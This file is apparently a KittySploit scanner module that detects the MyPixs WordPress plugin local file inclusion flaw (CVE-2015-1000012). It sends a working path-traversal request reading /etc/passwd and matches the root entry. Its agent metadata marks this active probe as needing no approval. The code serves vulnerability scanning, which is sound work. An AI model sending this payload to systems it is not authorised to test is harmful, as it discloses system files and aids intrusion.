#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress MyPixs 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress MyPixs <=0.3 - Local File Inclusion Detection',
        'description': 'WordPress MyPixs 0.3 and prior contains a local file inclusion vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wordpress', 'wp-plugin', 'lfi', 'wpscan', 'mypixs_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/24b83ce5-e3b8-4262-b087-a2dfec014985',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1000012',
            'http://www.vapidlabs.com/advisory.php?v=154',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1000012',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-1000012',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/mypixs/mypixs/downloadpage.php?url=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress MyPixs <=0.3 - Local File Inclusion detected",
                path='/wp-content/plugins/mypixs/mypixs/downloadpage.php?url=/etc/passwd',
            )
            return True
        return False

